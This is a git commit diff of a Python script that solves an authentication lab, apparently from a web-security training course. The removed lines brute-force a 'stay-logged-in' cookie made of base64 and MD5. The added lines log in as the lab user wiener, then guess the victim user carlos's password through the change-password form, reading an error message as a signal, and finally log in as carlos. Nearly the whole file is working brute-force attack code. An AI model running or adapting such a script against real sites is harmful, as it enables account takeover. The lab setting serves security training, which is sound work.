87b2d46c29aa6bf220a197540413b2bdbab41fe2
NANA-PREMPEH <oseiprempehwilliams@gmail.com>
2024-04-21 09:00:13 -0400

    lap 12 codes update

--- Authentication Vulnerabilities/lap 12: Password brute-force via password change/authentication-lab-12.py
+++ Authentication Vulnerabilities/lap 12: Password brute-force via password change/authentication-lab-12.py
@@ -1,41 +1,55 @@
 import requests
 import sys
 import urllib3
-import hashlib
-import base64
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def access_carlos_account(url):
+def access_carlos_account(s, url):
+
+    print("(+) Logging into Wiener's account...")
+    login_url = url + "/login"
+    login_data = {"username": "wiener", "password": "peter"}
+    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
 
     print("(+) Brute-forcing Carlos's password...")
-    with open('passwords.txt', 'r') as file:
-        for pwd in file:
-            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
-            encoded_pwd = base64.b64encode(bytes(hashed_pwd, "utf-8"))
-            str_pwd = encoded_pwd.decode("utf-8")
+    change_password_url = url + "/my-account/change-password"
+    
+    with open('passwords.txt', 'r') as f:
+        lines = f.readlines()
 
-            # perform the request
-            r  = requests.Session()
-            myaccount_url = url + "/my-account"
-            cookies = {'stay-logged-in': str_pwd}
-            req = r.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
-            if "Log out" in req.text:
-                print("(+) Carlos's password is: " + pwd)
-                sys.exit(-1)
+    for pwd in lines:
+        pwd = pwd.strip('\n')
+        change_password_data = {"username":"carlos","current-password": pwd, "new-password-1": "password1", "new-password-2": "password2"}
+        r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)
+        if "New passwords do not match" in r.text:
+            carlos_pwd = pwd
+            print("(+) Found Carlos's password: " + carlos_pwd)
+            break
+    
+    if carlos_pwd:
+        # login
+        login_data = {"username": "carlos", "password": carlos_pwd}
+        r = requests.post(login_url, data=login_data, verify=False, proxies=proxies)
+        if 'Log out' in r.text:
+            print("(+) Successfully logged into Carlos's account.")
+        else:
+            print("(-) Could not log into Carlos's account.")
+            sys.exit(-1)
+    else:
         print("(-) Could not find Carlos's password.")
+        sys.exit(-1)
 
 def main():
     if len(sys.argv) !=2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
-
+    
+    s = requests.Session()
     url = sys.argv[1]
-    access_carlos_account(url)
-
+    access_carlos_account(s, url)
 
 if __name__ == "__main__":
     main()
